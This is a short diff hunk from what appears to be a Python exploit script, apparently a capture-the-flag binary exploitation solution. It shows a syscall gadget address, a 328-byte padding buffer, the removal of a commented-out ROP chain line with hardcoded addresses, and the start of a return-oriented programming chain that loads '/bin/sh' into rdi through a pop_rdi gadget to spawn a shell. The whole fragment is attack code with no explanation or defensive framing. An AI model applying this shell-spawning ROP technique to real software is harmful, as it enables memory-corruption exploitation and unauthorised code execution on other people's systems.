@@ -14,7 +14,6 @@ syscall = 0x44f609             #syscall ; ret
 
 ####pad
 ropchain = b'\x00'*328    ##336
-#ropchain = p64(0x427a12)+p64(0xc4200c0000)+b'\x00'*8+p64(0xc4200c0000)+b'\x00'*40+p64(0xc420000180)+b'\x00'*8+p64(0x44e6c1)+b'\x00'*232
 
 ####move /bin/sh to [rdi]
 ropchain+=p64(pop_rdi)
